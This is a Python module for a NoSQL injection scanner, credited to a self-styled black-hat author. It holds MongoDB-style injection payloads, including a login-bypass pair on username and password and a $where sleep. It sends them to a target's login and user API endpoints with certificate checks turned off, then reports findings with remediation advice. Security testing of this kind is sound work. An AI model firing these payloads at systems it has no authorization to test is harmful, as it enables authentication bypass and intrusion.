# modules/vuln_scanner/nosqli_scanner.py

"""
NoSQL Injection Scanner
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Detects NoSQL injection vulnerabilities in MongoDB,
CouchDB, and other NoSQL databases.
"""

import json
from typing import Dict, List, Any, Optional

import requests
from requests.exceptions import RequestException


class NoSQLiScanner:
    """
    NoSQL Injection vulnerability scanner.
    
    Tests for NoSQL injection in MongoDB, CouchDB,
    Firebase, and other NoSQL databases.
    """
    
    NOSQL_PAYLOADS = [
        {'$gt': ''},
        {'$ne': None},
        {'$regex': '.*'},
        {'$where': '1==1'},
        {'$or': [{}, {}]},
        {'username': {'$ne': None}, 'password': {'$ne': None}},
        {'$where': "sleep(5000)"},
        "'; return true; var foo='",
    ]
    
    NOSQL_ERROR_PATTERNS = [
        r'MongoError',
        r'MongoDB',
        r'ObjectId',
        r'BSON',
        r'couchdb',
        r'couchbase',
        r'rethinkdb',
        r'firebase',
        r'documentdb',
    ]
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the NoSQL scanner.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target.rstrip('/')
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/json',
        })
        
        self.timeout = self.config.get('timeout', 10)
        self.verify_ssl = self.config.get('verify_ssl', False)
        
        self.vulnerabilities: List[Dict[str, Any]] = []
        self.errors: List[str] = []
    
    def test_json_injection(self, url: str) -> Optional[Dict[str, Any]]:
        """
        Test for NoSQL injection via JSON body.
        
        Args:
            url: Target URL
            
        Returns:
            Dictionary with finding or None
        """
        for payload in self.NOSQL_PAYLOADS[:5]:
            try:
                if isinstance(payload, dict):
                    test_data = {'username': payload, 'password': 'test'}
                else:
                    test_data = payload
                
                response = self.session.post(
                    url,
                    json=test_data,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )
                
                if response.status_code == 200:
                    response_text = response.text.lower()
                    
                    no_error = all(
                        keyword not in response_text
                        for keyword in ['invalid', 'incorrect', 'not found', 'error']
                    )
                    
                    if no_error:
                        return {
                            'url': url,
                            'type': 'json_body',
                            'payload': str(payload),
                            'status_code': response.status_code,
                        }
                
            except RequestException:
                continue
        
        return None
    
    def test_error_disclosure(self, url: str) -> Optional[Dict[str, Any]]:
        """
        Test for NoSQL error disclosure.
        
        Args:
            url: Target URL
            
        Returns:
            Dictionary with finding or None
        """
        error_payload = {'$where': "invalid_function()"}
        
        try:
            response = self.session.post(
                url,
                json=error_payload,
                timeout=self.timeout,
                verify=self.verify_ssl
            )
            
            for pattern in self.NOSQL_ERROR_PATTERNS:
                if pattern.lower() in response.text.lower():
                    return {
                        'url': url,
                        'type': 'error_disclosure',
                        'database': pattern,
                        'status_code': response.status_code,
                    }
            
            return None
            
        except RequestException:
            return None
    
    def run(self) -> Dict[str, Any]:
        """
        Run NoSQL injection scan.
        
        Returns:
            Dictionary with scan results
        """
        api_endpoints = [
            f"{self.target}/api/login",
            f"{self.target}/api/auth",
            f"{self.target}/api/users",
        ]
        
        for endpoint in api_endpoints:
            injection_result = self.test_json_injection(endpoint)
            
            if injection_result:
                self.vulnerabilities.append(injection_result)
            
            error_result = self.test_error_disclosure(endpoint)
            
            if error_result:
                self.vulnerabilities.append(error_result)
        
        findings = []
        
        for vuln in self.vulnerabilities:
            findings.append({
                'type': 'NoSQL Injection',
                'severity': 'high',
                'endpoint': vuln['url'],
                'description': f"NoSQL injection detected via {vuln['type']}",
                'evidence': vuln,
                'remediation': 'Use parameterized queries, input validation, and sanitize user input',
            })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'vulnerabilities_found': len(findings),
        }